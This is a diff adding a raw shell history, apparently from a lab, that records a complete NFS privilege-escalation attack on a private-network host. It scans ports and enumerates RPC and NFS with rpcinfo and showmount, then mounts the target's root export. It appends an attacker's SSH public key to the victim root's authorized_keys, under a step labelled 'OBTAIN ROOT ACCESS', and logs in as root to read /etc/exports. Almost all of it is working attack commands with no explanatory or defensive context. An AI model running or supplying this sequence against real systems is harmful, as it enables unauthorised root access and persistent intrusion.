@@ -1,0 +1,44 @@
+922  nmap -p 1-65535 -T4 -A -v 192.168.209.151 2>&1 | tee fileNFSscan.txt
+  923  egrep -i '(nfs|rpcbind|ssh)' fileNFSscan.txt
+  924  rpcinfo -p 192.168.209.151
+  925  rpcinfo -p 192.168.209.151 | grep nfs
+  926  showmount -e 192.168.209.151
+  927  mkdir -p /root/ .ssh
+  928  cd /root/.ssh/
+  929  cat /dev/null > allowed_hosts
+  930  ls
+  931  rm -r allowed_hosts
+  932  ls
+  933  cat known_hosts
+  934  cat /dev/null > known_hosts
+  935  ls
+  936  ssh-keygen -t rsa -b 4096
+  937  ls -l
+  938  cd /
+  939  pwd
+  940  mount -t nfs 192.168.209.151:/ /mnt -o nolock
+  941  NOLOCK DISABLES FILE LOCKING
+  942  df -k
+  943  MODIFY VICTIMS AUTHORIZED_KEYS FILE
+  944  ===================================
+  945  cd /mnt/root/.ssh
+  946  ls
+  947  cp /root/.ssh/noondi_rsa.pub /mnt/root/.ssh/
+  948  ls -l
+  949  cat authorized_keys
+  950  cat noondi_rsa.pub >> authorized_keys
+  951  cat authorized_keys
+  952  OBTAIN ROOT ACCESS
+  953  ==================
+  954  cd /root/.ssh/
+  955  pwd
+  956  ssh -i /root/.ssh/noondi_rsa root@192.168.209.151
+  957  showmount -a 192.168.209.151
+  958  umount /mnt
+  959  df -k
+  960  showmount -a 192.168.209.151
+  961  ssh -i /root/.ssh/noondi_rsa root@192.168.209.151 "cat /etc/exports"
+  962  ssh -i /root/.ssh/noondi_rsa root@192.168.209.151 "date"
+  963  echo "Noondi"
+  964  date
+  965  history
